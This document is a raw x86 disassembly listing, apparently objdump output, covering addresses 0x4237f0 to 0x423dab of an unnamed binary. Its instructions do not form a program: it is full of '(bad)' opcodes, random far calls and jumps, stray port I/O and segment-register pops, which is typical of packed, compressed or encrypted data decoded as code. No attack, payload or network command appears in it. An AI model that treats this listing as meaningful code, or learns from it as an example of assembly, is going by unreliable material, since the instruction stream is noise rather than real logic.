  4237f0:	0d ad 84 a6 d5       	or     $0xd5a684ad,%eax
  4237f5:	fc                   	cld
  4237f6:	2d 80 b5 97 22       	sub    $0x2297b580,%eax
  4237fb:	bb c5 80 b2 b8       	mov    $0xb8b280c5,%ebx
  423800:	39 14 80             	cmp    %edx,(%eax,%eax,4)
  423803:	75 cc                	jne    0x4237d1
  423805:	1a 20                	sbb    (%eax),%ah
  423807:	f6 d2                	not    %dl
  423809:	5d                   	pop    %ebp
  42380a:	6b 9d 9b 9e e4 fd c6 	imul   $0xffffffc6,-0x21b6165(%ebp),%ebx
  423811:	48                   	dec    %eax
  423812:	76 bf                	jbe    0x4237d3
  423814:	8d b4 04 3d 9b 2e da 	lea    -0x25d164c3(%esp,%eax,1),%esi
  42381b:	61                   	popa
  42381c:	39 75 ad             	cmp    %esi,-0x53(%ebp)
  42381f:	18 b4 23 23 b6 07 b4 	sbb    %dh,-0x4bf849dd(%ebx,%eiz,1)
  423826:	c7                   	(bad)
  423827:	d8 37                	fdivs  (%edi)
  423829:	f5                   	cmc
  42382a:	bb c6 46 c0 20       	mov    $0x20c046c6,%ebx
  42382f:	aa                   	stos   %al,%es:(%edi)
  423830:	33 47 a7             	xor    -0x59(%edi),%eax
  423833:	53                   	push   %ebx
  423834:	31 60 42             	xor    %esp,0x42(%eax)
  423837:	bb 04 bd 8d 8c       	mov    $0x8c8dbd04,%ebx
  42383c:	16                   	push   %ss
  42383d:	9d                   	popf
  42383e:	9f                   	lahf
  42383f:	54                   	push   %esp
  423840:	df db                	(bad)
  423842:	3e f7 be 84 3c 90 b8 	idivl  %ds:-0x476fc37c(%esi)
  423849:	6a 45                	push   $0x45
  42384b:	43                   	inc    %ebx
  42384c:	ce                   	into
  42384d:	a0 57 88 d0 9e       	mov    0x9ed08857,%al
  423852:	9e                   	sahf
  423853:	0b 39                	or     (%ecx),%edi
  423855:	27                   	daa
  423856:	bb 34 21 c0 bd       	mov    $0xbdc02134,%ebx
  42385b:	1a 86 2c 0f bc 89    	sbb    -0x7643f0d4(%esi),%al
  423861:	a0 10 84 1d ba       	mov    0xba1d8410,%al
  423866:	02 49 b9             	add    -0x47(%ecx),%cl
  423869:	65 3f                	gs aas
  42386b:	ee                   	out    %al,(%dx)
  42386c:	c6                   	(bad)
  42386d:	0b 00                	or     (%eax),%eax
  42386f:	18 12                	sbb    %dl,(%edx)
  423871:	37                   	aaa
  423872:	52                   	push   %edx
  423873:	c3                   	ret
  423874:	db de                	fcmovnu %st(6),%st
  423876:	54                   	push   %esp
  423877:	2d 9d 80 31 95       	sub    $0x9531809d,%eax
  42387c:	10 a3 b4 bf 39 9d    	adc    %ah,-0x62c6404c(%ebx)
  423882:	83 c1 08             	add    $0x8,%ecx
  423885:	e0 a2                	loopne 0x423829
  423887:	67 db 1e 8b ef       	fistpl -0x1075
  42388c:	2d e6 b4 d7 33       	sub    $0x33d7b4e6,%eax
  423891:	92                   	xchg   %eax,%edx
  423892:	ba 88 05 95 2d       	mov    $0x2d950588,%edx
  423897:	a0 88 bc 12 4f       	mov    0x4f12bc88,%al
  42389c:	a2 9f 6c cf eb       	mov    %al,0xebcf6c9f
  4238a1:	b4 72                	mov    $0x72,%ah
  4238a3:	bf f9 b4 c4 c4       	mov    $0xc4c4b4f9,%edi
  4238a8:	0a d0                	or     %al,%dl
  4238aa:	3f                   	aas
  4238ab:	e4 80                	in     $0x80,%al
  4238ad:	f8                   	clc
  4238ae:	50                   	push   %eax
  4238af:	4f                   	dec    %edi
  4238b0:	db cd                	fcmovne %st(5),%st
  4238b2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4238b3:	b6 36                	mov    $0x36,%dh
  4238b5:	4a                   	dec    %edx
  4238b6:	c2 5f ba             	ret    $0xba5f
  4238b9:	a1 14 1b bf 14       	mov    0x14bf1b14,%eax
  4238be:	30 5d 30             	xor    %bl,0x30(%ebp)
  4238c1:	e0 e5                	loopne 0x4238a8
  4238c3:	1f                   	pop    %ds
  4238c4:	ad                   	lods   %ds:(%esi),%eax
  4238c5:	e6 33                	out    %al,$0x33
  4238c7:	fa                   	cli
  4238c8:	64 8e 90 a2 73 73 92 	mov    %fs:-0x6d8c8c5e(%eax),%ss
  4238cf:	37                   	aaa
  4238d0:	15 08 9c 25 27       	adc    $0x27259c08,%eax
  4238d5:	ba 6c 17 9c 2a       	mov    $0x2a9c176c,%edx
  4238da:	13 3e                	adc    (%esi),%edi
  4238dc:	62 d2 d5 23 cd 60 54 	vrsqrt28sd 0x2a0(%eax),(bad),%xmm4{%k3}
  4238e3:	1a df                	sbb    %bh,%bl
  4238e5:	14 66                	adc    $0x66,%al
  4238e7:	35 2b 47 8c 5a       	xor    $0x5a8c472b,%eax
  4238ec:	00 6e f3             	add    %ch,-0xd(%esi)
  4238ef:	7d 63                	jge    0x423954
  4238f1:	d3 0c ff             	rorl   %cl,(%edi,%edi,8)
  4238f4:	97                   	xchg   %eax,%edi
  4238f5:	ee                   	out    %al,(%dx)
  4238f6:	1e                   	push   %ds
  4238f7:	03 a1 20 ea f6 8d    	add    -0x720915e0(%ecx),%esp
  4238fd:	89 0f                	mov    %ecx,(%edi)
  4238ff:	9a 8e ae ea 87 4c 70 	lcall  $0x704c,$0x87eaae8e
  423906:	8a 05 57 7c e5 10    	mov    0x10e57c57,%al
  42390c:	68 e5 aa 57 23       	push   $0x2357aae5
  423911:	ca b0 de             	lret   $0xdeb0
  423914:	4d                   	dec    %ebp
  423915:	f3 3f                	repz aas
  423917:	46                   	inc    %esi
  423918:	12 35 9b 0b 20 de    	adc    0xde200b9b,%dh
  42391e:	a9 a9 ef 66 41       	test   $0x4166efa9,%eax
  423923:	7a cf                	jp     0x4238f4
  423925:	0f a9                	pop    %gs
  423927:	23 23                	and    (%ebx),%esp
  423929:	f6 53 2b             	notb   0x2b(%ebx)
  42392c:	d8 07                	fadds  (%edi)
  42392e:	61                   	popa
  42392f:	24 e6                	and    $0xe6,%al
  423931:	4b                   	dec    %ebx
  423932:	ae                   	scas   %es:(%edi),%al
  423933:	96                   	xchg   %eax,%esi
  423934:	3d aa 49 be a9       	cmp    $0xa9be49aa,%eax
  423939:	52                   	push   %edx
  42393a:	2f                   	das
  42393b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42393c:	8f                   	(bad)
  42393d:	76 0d                	jbe    0x42394c
  42393f:	0c 8f                	or     $0x8f,%al
  423941:	20 2c 33             	and    %ch,(%ebx,%esi,1)
  423944:	d2 07                	rolb   %cl,(%edi)
  423946:	34 a0                	xor    $0xa0,%al
  423948:	bb 9a c2 e9 49       	mov    $0x49e9c29a,%ebx
  42394d:	f7 10                	notl   (%eax)
  42394f:	a9 0e bc 9d 50       	test   $0x509dbc0e,%eax
  423954:	ce                   	into
  423955:	63 4f f7             	arpl   %ecx,-0x9(%edi)
  423958:	73 8f                	jae    0x4238e9
  42395a:	fa                   	cli
  42395b:	e3 01                	jecxz  0x42395e
  42395d:	c3                   	ret
  42395e:	c6                   	(bad)
  42395f:	aa                   	stos   %al,%es:(%edi)
  423960:	e8 58 96 36 1d       	call   0x1d78cfbd
  423965:	2c a4                	sub    $0xa4,%al
  423967:	5e                   	pop    %esi
  423968:	51                   	push   %ecx
  423969:	aa                   	stos   %al,%es:(%edi)
  42396a:	cd 72                	int    $0x72
  42396c:	06                   	push   %es
  42396d:	72 63                	jb     0x4239d2
  42396f:	ab                   	stos   %eax,%es:(%edi)
  423970:	e8 4d 41 25 da       	call   0xda677ac2
  423975:	d6                   	salc
  423976:	74 47                	je     0x4239bf
  423978:	ec                   	in     (%dx),%al
  423979:	d6                   	salc
  42397a:	0e                   	push   %cs
  42397b:	d9 f9                	fyl2xp1
  42397d:	e5 79                	in     $0x79,%eax
  42397f:	f2 37                	repnz aaa
  423981:	f8                   	clc
  423982:	09 f8                	or     %edi,%eax
  423984:	d5 b7                	aad    $0xb7
  423986:	5d                   	pop    %ebp
  423987:	44                   	inc    %esp
  423988:	df 50 ca             	fists  -0x36(%eax)
  42398b:	cc                   	int3
  42398c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42398d:	aa                   	stos   %al,%es:(%edi)
  42398e:	60                   	pusha
  42398f:	16                   	push   %ss
  423990:	20 e9                	and    %ch,%cl
  423992:	11 3d 4a 14 34 e7    	adc    %edi,0xe734144a
  423998:	a1 f4 30 80 82       	mov    0x828030f4,%eax
  42399d:	ad                   	lods   %ds:(%esi),%eax
  42399e:	20 60 60             	and    %ah,0x60(%eax)
  4239a1:	8f                   	(bad)
  4239a2:	ce                   	into
  4239a3:	42                   	inc    %edx
  4239a4:	4a                   	dec    %edx
  4239a5:	7e b5                	jle    0x42395c
  4239a7:	0a 63 3f             	or     0x3f(%ebx),%ah
  4239aa:	9c                   	pushf
  4239ab:	0a ad 51 b0 e0 38    	or     0x38e0b051(%ebp),%ch
  4239b1:	e6 9e                	out    %al,$0x9e
  4239b3:	e6 f5                	out    %al,$0xf5
  4239b5:	ff b2 cb cd ed 44    	push   0x44edcdcb(%edx)
  4239bb:	13 df                	adc    %edi,%ebx
  4239bd:	9b                   	fwait
  4239be:	fd                   	std
  4239bf:	60                   	pusha
  4239c0:	41                   	inc    %ecx
  4239c1:	0c f6                	or     $0xf6,%al
  4239c3:	1b 3a                	sbb    (%edx),%edi
  4239c5:	27                   	daa
  4239c6:	b4 0a                	mov    $0xa,%ah
  4239c8:	f6 fb                	idiv   %bl
  4239ca:	0f c3 84 e2 1d 6a 87 	movnti %eax,-0x6c7895e3(%edx,%eiz,8)
  4239d1:	93 
  4239d2:	14 bc                	adc    $0xbc,%al
  4239d4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4239d5:	f5                   	cmc
  4239d6:	23 31                	and    (%ecx),%esi
  4239d8:	be ac 59 72 1b       	mov    $0x1b7259ac,%esi
  4239dd:	1e                   	push   %ds
  4239de:	9c                   	pushf
  4239df:	2a 01                	sub    (%ecx),%al
  4239e1:	37                   	aaa
  4239e2:	16                   	push   %ss
  4239e3:	89 50 a3             	mov    %edx,-0x5d(%eax)
  4239e6:	e9 4d 66 26 ff       	jmp    0xff68a038
  4239eb:	5c                   	pop    %esp
  4239ec:	d0 a2 23 4e 99 5b    	shlb   $1,0x5b994e23(%edx)
  4239f2:	17                   	pop    %ss
  4239f3:	67 d5 ee             	addr16 aad $0xee
  4239f6:	91                   	xchg   %eax,%ecx
  4239f7:	9c                   	pushf
  4239f8:	2e a3 a7 b9 3c 0b    	mov    %eax,%cs:0xb3cb9a7
  4239fe:	49                   	dec    %ecx
  4239ff:	d2 d6                	rcl    %cl,%dh
  423a01:	ff a4 8b 11 97 9c 78 	jmp    *0x789c9711(%ebx,%ecx,4)
  423a08:	d6                   	salc
  423a09:	8e f4                	mov    %esp,%?
  423a0b:	5b                   	pop    %ebx
  423a0c:	d0 64 42 77          	shlb   $1,0x77(%edx,%eax,2)
  423a10:	37                   	aaa
  423a11:	24 72                	and    $0x72,%al
  423a13:	06                   	push   %es
  423a14:	89 28                	mov    %ebp,(%eax)
  423a16:	00 dc                	add    %bl,%ah
  423a18:	9f                   	lahf
  423a19:	1d 16 fc a7 88       	sbb    $0x88a7fc16,%eax
  423a1e:	55                   	push   %ebp
  423a1f:	9b d9 a7 f4 e5 4b 5d 	fldenv 0x5d4be5f4(%edi)
  423a26:	f5                   	cmc
  423a27:	6d                   	insl   (%dx),%es:(%edi)
  423a28:	5c                   	pop    %esp
  423a29:	72 dc                	jb     0x423a07
  423a2b:	06                   	push   %es
  423a2c:	b9 77 ea 8b 6d       	mov    $0x6d8bea77,%ecx
  423a31:	7f fe                	jg     0x423a31
  423a33:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  423a34:	de e4                	fsubp  %st,%st(4)
  423a36:	34 25                	xor    $0x25,%al
  423a38:	09 36                	or     %esi,(%esi)
  423a3a:	82 d6 c5             	adc    $0xc5,%dh
  423a3d:	b6 a2                	mov    $0xa2,%dh
  423a3f:	59                   	pop    %ecx
  423a40:	df 50 af             	fists  -0x51(%eax)
  423a43:	58                   	pop    %eax
  423a44:	24 21                	and    $0x21,%al
  423a46:	bd 39 32 f1 61       	mov    $0x61f13239,%ebp
  423a4b:	cc                   	int3
  423a4c:	d6                   	salc
  423a4d:	d0 4b e5             	rorb   $1,-0x1b(%ebx)
  423a50:	c0 89 96 de ec e0 36 	rorb   $0x36,-0x1f13216a(%ecx)
  423a57:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  423a58:	4c                   	dec    %esp
  423a59:	47                   	inc    %edi
  423a5a:	c1 68 c1 a0          	shrl   $0xa0,-0x3f(%eax)
  423a5e:	01 c2                	add    %eax,%edx
  423a60:	86 33                	xchg   %dh,(%ebx)
  423a62:	1e                   	push   %ds
  423a63:	07                   	pop    %es
  423a64:	cd dc                	int    $0xdc
  423a66:	c6                   	(bad)
  423a67:	c9                   	leave
  423a68:	53                   	push   %ebx
  423a69:	85 4c f5 ed          	test   %ecx,-0x13(%ebp,%esi,8)
  423a6d:	d5 bf                	aad    $0xbf
  423a6f:	3e 4f                	ds dec %edi
  423a71:	78 59                	js     0x423acc
  423a73:	44                   	inc    %esp
  423a74:	c6                   	(bad)
  423a75:	57                   	push   %edi
  423a76:	53                   	push   %ebx
  423a77:	7b e8                	jnp    0x423a61
  423a79:	0e                   	push   %cs
  423a7a:	2a 9d 79 ae f0 3e    	sub    0x3ef0ae79(%ebp),%bl
  423a80:	77 e1                	ja     0x423a63
  423a82:	81 a8 22 fc bf 88 3c 	subl   $0x6681a53c,-0x774003de(%eax)
  423a89:	a5 81 66 
  423a8c:	46                   	inc    %esi
  423a8d:	8c 33                	mov    %?,(%ebx)
  423a8f:	a2 58 38 d3 3b       	mov    %al,0x3bd33858
  423a94:	e6 16                	out    %al,$0x16
  423a96:	53                   	push   %ebx
  423a97:	25 3b 2c 54 dd       	and    $0xdd542c3b,%eax
  423a9c:	8f a9 17 93          	(bad)
  423aa0:	a0 e2 78 60 9e       	mov    0x9e6078e2,%al
  423aa5:	ba 5b 49 d8 55       	mov    $0x55d8495b,%edx
  423aaa:	5d                   	pop    %ebp
  423aab:	60                   	pusha
  423aac:	59                   	pop    %ecx
  423aad:	41                   	inc    %ecx
  423aae:	2e aa                	cs stos %al,%es:(%edi)
  423ab0:	a9 9a 20 93 bb       	test   $0xbb93209a,%eax
  423ab5:	18 9f ed dc 4b c5    	sbb    %bl,-0x3ab42313(%edi)
  423abb:	04 5f                	add    $0x5f,%al
  423abd:	a1 87 7a 60 7a       	mov    0x7a607a87,%eax
  423ac2:	e1 93                	loope  0x423a57
  423ac4:	42                   	inc    %edx
  423ac5:	53                   	push   %ebx
  423ac6:	fb                   	sti
  423ac7:	3b 74 d3 b5          	cmp    -0x4b(%ebx,%edx,8),%esi
  423acb:	28 3a                	sub    %bh,(%edx)
  423acd:	35 bf c1 3c ee       	xor    $0xee3cc1bf,%eax
  423ad2:	5e                   	pop    %esi
  423ad3:	d2 2a                	shrb   %cl,(%edx)
  423ad5:	ab                   	stos   %eax,%es:(%edi)
  423ad6:	a3 83 3c b4 b5       	mov    %eax,0xb5b43c83
  423adb:	83 d6 58             	adc    $0x58,%esi
  423ade:	5b                   	pop    %ebx
  423adf:	65 c0 71 5d 1e       	shlb   $0x1e,%gs:0x5d(%ecx)
  423ae4:	3d 22 6b 3b e4       	cmp    $0xe43b6b22,%eax
  423ae9:	b3 12                	mov    $0x12,%bl
  423aeb:	d0 8e fc c0 f5 88    	rorb   $1,-0x770a3f04(%esi)
  423af1:	f5                   	cmc
  423af2:	01 c6                	add    %eax,%esi
  423af4:	9a 26 13 96 c0 34 25 	lcall  $0x2534,$0xc0961326
  423afb:	20 be 58 37 71 b0    	and    %bh,-0x4f8ec8a8(%esi)
  423b01:	f6 89 c5 06 d2 93 fe 	testb  $0xfe,-0x6c2df93b(%ecx)
  423b08:	18 8b 22 27 66 10    	sbb    %cl,0x10662722(%ebx)
  423b0e:	ff 08                	decl   (%eax)
  423b10:	78 e1                	js     0x423af3
  423b12:	f1                   	int1
  423b13:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  423b14:	aa                   	stos   %al,%es:(%edi)
  423b15:	76 27                	jbe    0x423b3e
  423b17:	02 b4 2f 39 3b e9 58 	add    0x58e93b39(%edi,%ebp,1),%dh
  423b1e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  423b1f:	40                   	inc    %eax
  423b20:	3f                   	aas
  423b21:	a1 25 8d b2 9a       	mov    0x9ab28d25,%eax
  423b26:	86 22                	xchg   %ah,(%edx)
  423b28:	0f 92 d1             	setb   %cl
  423b2b:	5f                   	pop    %edi
  423b2c:	26 6b 9b 78 87 fc 61 	imul   $0xffffffed,%es:0x61fc8778(%ebx),%ebx
  423b33:	ed 
  423b34:	fa                   	cli
  423b35:	dd bc ea 64 dd 45 ac 	fnstsw -0x53ba229c(%edx,%ebp,8)
  423b3c:	4e                   	dec    %esi
  423b3d:	8f c3                	pop    %ebx
  423b3f:	9c                   	pushf
  423b40:	48                   	dec    %eax
  423b41:	a8 f5                	test   $0xf5,%al
  423b43:	86 b2 0c ff 5b a4    	xchg   %dh,-0x5ba400f4(%edx)
  423b49:	b6 cd                	mov    $0xcd,%dh
  423b4b:	36 47                	ss inc %edi
  423b4d:	27                   	daa
  423b4e:	ac                   	lods   %ds:(%esi),%al
  423b4f:	7f d5                	jg     0x423b26
  423b51:	f0 ea c8 4e e4 cb f0 	lock ljmp $0x60f0,$0xcbe44ec8
  423b58:	60 
  423b59:	2f                   	das
  423b5a:	e1 21                	loope  0x423b7d
  423b5c:	0f af 98 f1 04 51 91 	imul   -0x6eaefb0f(%eax),%ebx
  423b63:	7f a0                	jg     0x423b05
  423b65:	7d 47                	jge    0x423bae
  423b67:	34 34                	xor    $0x34,%al
  423b69:	2a 0c aa             	sub    (%edx,%ebp,4),%cl
  423b6c:	37                   	aaa
  423b6d:	b3 44                	mov    $0x44,%bl
  423b6f:	55                   	push   %ebp
  423b70:	9c                   	pushf
  423b71:	f2 2c d8             	repnz sub $0xd8,%al
  423b74:	d5 1e                	aad    $0x1e
  423b76:	17                   	pop    %ss
  423b77:	b8 a4 36 d7 e6       	mov    $0xe6d736a4,%eax
  423b7c:	d7                   	xlat   %ds:(%ebx)
  423b7d:	6e                   	outsb  %ds:(%esi),(%dx)
  423b7e:	a9 73 41 b3 08       	test   $0x8b34173,%eax
  423b83:	8c f9                	mov    %?,%ecx
  423b85:	82 8f dc 0c 27 52 44 	orb    $0x44,0x52270cdc(%edi)
  423b8c:	22 83 b7 ae 34 ba    	and    -0x45cb5149(%ebx),%al
  423b92:	c1 87 4b a0 c2 98 5d 	roll   $0x5d,-0x673d5fb5(%edi)
  423b99:	f1                   	int1
  423b9a:	d4 f9                	aam    $0xf9
  423b9c:	a1 27 03 33 88       	mov    0x88330327,%eax
  423ba1:	de 15 ea a2 33 8a    	ficoms 0x8a33a2ea
  423ba7:	50                   	push   %eax
  423ba8:	57                   	push   %edi
  423ba9:	d1 41 bc             	roll   $1,-0x44(%ecx)
  423bac:	d6                   	salc
  423bad:	4b                   	dec    %ebx
  423bae:	6b 99 29 ab a0 c3 3b 	imul   $0x3b,-0x3c5f54d7(%ecx),%ebx
  423bb5:	2c b1                	sub    $0xb1,%al
  423bb7:	1c 13                	sbb    $0x13,%al
  423bb9:	36 7d c3             	ss jge 0x423b7f
  423bbc:	e2 54                	loop   0x423c12
  423bbe:	57                   	push   %edi
  423bbf:	de d2                	(bad)
  423bc1:	ae                   	scas   %es:(%edi),%al
  423bc2:	a2 91 ce d3 9b       	mov    %al,0x9bd3ce91
  423bc7:	58                   	pop    %eax
  423bc8:	f6 40 0f 79          	testb  $0x79,0xf(%eax)
  423bcc:	49                   	dec    %ecx
  423bcd:	73 1f                	jae    0x423bee
  423bcf:	1c 9c                	sbb    $0x9c,%al
  423bd1:	28 19                	sub    %bl,(%ecx)
  423bd3:	35 a6 08 21 a0       	xor    $0xa02108a6,%eax
  423bd8:	01 fc                	add    %edi,%esp
  423bda:	4d                   	dec    %ebp
  423bdb:	8b 32                	mov    (%edx),%esi
  423bdd:	97                   	xchg   %eax,%edi
  423bde:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  423bdf:	9e                   	sahf
  423be0:	42                   	inc    %edx
  423be1:	2a db                	sub    %bl,%bl
  423be3:	32 a9 e5 56 de c9    	xor    -0x3621a91b(%ecx),%ch
  423be9:	ad                   	lods   %ds:(%esi),%eax
  423bea:	60                   	pusha
  423beb:	81 46 b4 22 38 a5 3f 	addl   $0x3fa53822,-0x4c(%esi)
  423bf2:	2c 23                	sub    $0x23,%al
  423bf4:	b7 46                	mov    $0x46,%bh
  423bf6:	3e aa                	ds stos %al,%es:(%edi)
  423bf8:	b1 89                	mov    $0x89,%cl
  423bfa:	38 ad a3 6d ba f4    	cmp    %ch,-0xb45925d(%ebp)
  423c00:	4d                   	dec    %ebp
  423c01:	eb 24                	jmp    0x423c27
  423c03:	9f                   	lahf
  423c04:	9f                   	lahf
  423c05:	b3 16                	mov    $0x16,%bl
  423c07:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  423c08:	69 5a c0 49 7b 7d 4f 	imul   $0x4f7d7b49,-0x40(%edx),%ebx
  423c0f:	00 65 64             	add    %ah,0x64(%ebp)
  423c12:	ec                   	in     (%dx),%al
  423c13:	4b                   	dec    %ebx
  423c14:	17                   	pop    %ss
  423c15:	6f                   	outsl  %ds:(%esi),(%dx)
  423c16:	9e                   	sahf
  423c17:	92                   	xchg   %eax,%edx
  423c18:	01 56 98             	add    %edx,-0x68(%esi)
  423c1b:	55                   	push   %ebp
  423c1c:	23 19                	and    (%ecx),%ebx
  423c1e:	aa                   	stos   %al,%es:(%edi)
  423c1f:	21 ad b0 44 47 df    	and    %ebp,-0x20b8bb50(%ebp)
  423c25:	5b                   	pop    %ebx
  423c26:	96                   	xchg   %eax,%esi
  423c27:	6f                   	outsl  %ds:(%esi),(%dx)
  423c28:	09 02                	or     %eax,(%edx)
  423c2a:	60                   	pusha
  423c2b:	16                   	push   %ss
  423c2c:	fb                   	sti
  423c2d:	25 72 39 40 cc       	and    $0xcc403972,%eax
  423c32:	6c                   	insb   (%dx),%es:(%edi)
  423c33:	90                   	nop
  423c34:	f7 97 7e 36 3c 23    	notl   0x233c367e(%edi)
  423c3a:	b5 0f                	mov    $0xf,%ch
  423c3c:	2e fc                	cs cld
  423c3e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  423c3f:	e8 20 d5 99 c1       	call   0xc1dc1164
  423c44:	12 ae 8b 9a 04 87    	adc    -0x78fb6575(%esi),%ch
  423c4a:	7d 73                	jge    0x423cbf
  423c4c:	f6 5f 6f             	negb   0x6f(%edi)
  423c4f:	4c                   	dec    %esp
  423c50:	e8 38 61 25 da       	call   0xda679d8d
  423c55:	11 53 fe             	adc    %edx,-0x2(%ebx)
  423c58:	cc                   	int3
  423c59:	ea 45 d7 be c3 37 b0 	ljmp   $0xb037,$0xc3bed745
  423c60:	b0 9c                	mov    $0x9c,%al
  423c62:	29 89 a2 75 1b 62    	sub    %ecx,0x621b75a2(%ecx)
  423c68:	94                   	xchg   %eax,%esp
  423c69:	4e                   	dec    %esi
  423c6a:	0d 3b 86 27 ff       	or     $0xff27863b,%eax
  423c6f:	13 78 00             	adc    0x0(%eax),%edi
  423c72:	f1                   	int1
  423c73:	ec                   	in     (%dx),%al
  423c74:	6a d9                	push   $0xffffffd9
  423c76:	e3 c5                	jecxz  0x423c3d
  423c78:	5c                   	pop    %esp
  423c79:	b2 d5                	mov    $0xd5,%dl
  423c7b:	9e                   	sahf
  423c7c:	4e                   	dec    %esi
  423c7d:	8b c7                	mov    %edi,%eax
  423c7f:	77 40                	ja     0x423cc1
  423c81:	64 b9 50 32 3d ab    	fs mov $0xab3d3250,%ecx
  423c87:	29 24 16             	sub    %esp,(%esi,%edx,1)
  423c8a:	9d                   	popf
  423c8b:	02 16                	add    (%esi),%dl
  423c8d:	ef                   	out    %eax,(%dx)
  423c8e:	8f                   	(bad)
  423c8f:	db 08                	fisttpl (%eax)
  423c91:	c8 81 b4 fa          	enter  $0xb481,$0xfa
  423c95:	a0 73 8d ec 79       	mov    0x79ec8d73,%al
  423c9a:	65 66 de 52 57       	data16 ficoms %gs:0x57(%edx)
  423c9f:	3f                   	aas
  423ca0:	d0 2b                	shrb   $1,(%ebx)
  423ca2:	49                   	dec    %ecx
  423ca3:	18 c2                	sbb    %al,%dl
  423ca5:	04 3b                	add    $0x3b,%al
  423ca7:	f1                   	int1
  423ca8:	b4 dd                	mov    $0xdd,%ah
  423caa:	2d ca a6 b6 1f       	sub    $0x1fb6a6ca,%eax
  423caf:	a3 98 8f 11 7c       	mov    %eax,0x7c118f98
  423cb4:	8a 68 03             	mov    0x3(%eax),%ch
  423cb7:	55                   	push   %ebp
  423cb8:	7c 41                	jl     0x423cfb
  423cba:	f5                   	cmc
  423cbb:	2d 6e 1a e7 06       	sub    $0x6e71a6e,%eax
  423cc0:	60                   	pusha
  423cc1:	f3 d9 df             	repz (bad)
  423cc4:	52                   	push   %edx
  423cc5:	cc                   	int3
  423cc6:	cb                   	lret
  423cc7:	b8 44 a5 bd 91       	mov    $0x91bda544,%eax
  423ccc:	36 7e af             	ss jle 0x423c7e
  423ccf:	6a 28                	push   $0x28
  423cd1:	57                   	push   %edi
  423cd2:	a1 43 1a 30 93       	mov    0x93301a43,%eax
  423cd7:	1c 0c                	sbb    $0xc,%al
  423cd9:	09 85 f5 fe e1 77    	or     %eax,0x77e1fef5(%ebp)
  423cdf:	ce                   	into
  423ce0:	f0 ba 69 a7 e2 93    	lock mov $0x93e2a769,%edx
  423ce6:	5b                   	pop    %ebx
  423ce7:	80 d4 6c             	adc    $0x6c,%ah
  423cea:	4d                   	dec    %ebp
  423ceb:	59                   	pop    %ecx
  423cec:	c6 45 3f 32          	movb   $0x32,0x3f(%ebp)
  423cf0:	b8 1e 31 0b aa       	mov    $0xaa0b311e,%eax
  423cf5:	f7 23                	mull   (%ebx)
  423cf7:	e4 9c                	in     $0x9c,%al
  423cf9:	d0 15 bd 8e a9 07    	rclb   $1,0x7a98ebd
  423cff:	96                   	xchg   %eax,%esi
  423d00:	80 82 f9 6e 72 5b eb 	addb   $0xeb,0x5b726ef9(%edx)
  423d07:	47                   	inc    %edi
  423d08:	64 34 dd             	fs xor $0xdd,%al
  423d0b:	20 56 0d             	and    %dl,0xd(%esi)
  423d0e:	cf                   	iret
  423d0f:	f9                   	stc
  423d10:	48                   	dec    %eax
  423d11:	e6 c1                	out    %al,$0xc1
  423d13:	d2 3a                	sarb   %cl,(%edx)
  423d15:	bf b3 ab 2c 98       	mov    $0x982cabb3,%edi
  423d1a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  423d1b:	84 1e                	test   %bl,(%esi)
  423d1d:	71 97                	jno    0x423cb6
  423d1f:	5d                   	pop    %ebp
  423d20:	10 4a 89             	adc    %cl,-0x77(%edx)
  423d23:	36 02 23             	add    %ss:(%ebx),%ah
  423d26:	7b 0f                	jnp    0x423d37
  423d28:	f4                   	hlt
  423d29:	fb                   	sti
  423d2a:	6d                   	insl   (%dx),%es:(%edi)
  423d2b:	e8 e6 d4 5f c1       	call   0xc1a21216
  423d30:	d8 ad 51 9a ca 86    	fsubrs -0x793565af(%ebp)
  423d36:	43                   	inc    %ebx
  423d37:	73 bc                	jae    0x423cf5
  423d39:	5f                   	pop    %edi
  423d3a:	35 4c ae 38 27       	xor    $0x2738ae4c,%eax
  423d3f:	25 a0 11 19 fe       	and    $0xfe1911a0,%eax
  423d44:	92                   	xchg   %eax,%edx
  423d45:	ea 0b d7 84 c3 fd af 	ljmp   $0xaffd,$0xc384d70b
  423d4c:	76 9c                	jbe    0x423cea
  423d4e:	ef                   	out    %eax,(%dx)
  423d4f:	88 68 75             	mov    %ch,0x75(%eax)
  423d52:	e1 61                	loope  0x423db5
  423d54:	5a                   	pop    %edx
  423d55:	4e                   	dec    %esi
  423d56:	d3 3a                	sarl   %cl,(%edx)
  423d58:	4c                   	dec    %esp
  423d59:	27                   	daa
  423d5a:	c5 13                	lds    (%ebx),%edx
  423d5c:	3e 00 b7 ec 30 d9 a9 	add    %dh,%ds:-0x5626cf14(%edi)
  423d63:	c5 22                	lds    (%edx),%esp
  423d65:	b2 9b                	mov    $0x9b,%dl
  423d67:	9e                   	sahf
  423d68:	14 8b                	adc    $0x8b,%al
  423d6a:	8d 77 06             	lea    0x6(%edi),%esi
  423d6d:	64 7f 50             	fs jg  0x423dc0
  423d70:	f8                   	clc
  423d71:	3c 71                	cmp    $0x71,%al
  423d73:	29 ea                	sub    %ebp,%edx
  423d75:	15 63 02 dc ee       	adc    $0xeedc0263,%eax
  423d7a:	55                   	push   %ebp
  423d7b:	db ce                	fcmovne %st(6),%st
  423d7d:	c7 47 b4 c0 a0 39 8d 	movl   $0x8d39a0c0,-0x4c(%edi)
  423d84:	b2 79                	mov    $0x79,%dl
  423d86:	2b 66 a4             	sub    -0x5c(%esi),%esp
  423d89:	52                   	push   %edx
  423d8a:	1d 3f 96 2b 0f       	sbb    $0xf2b963f,%eax
  423d8f:	18 88 04 01 f1 7a    	sbb    %cl,0x7af10104(%eax)
  423d95:	dd f3                	(bad)
  423d97:	c9                   	leave
  423d98:	6c                   	insb   (%dx),%es:(%edi)
  423d99:	b6 e5                	mov    $0xe5,%dh
  423d9b:	a2 5e 8f d7 7b       	mov    %al,0x7bd78f5e
  423da0:	50                   	push   %eax
  423da1:	68 c9 54 42 41       	push   $0x414254c9
  423da6:	bb 2d 34 1a ad       	mov    $0xad1a342d,%ebx
  423dab:	06                   	push   %es
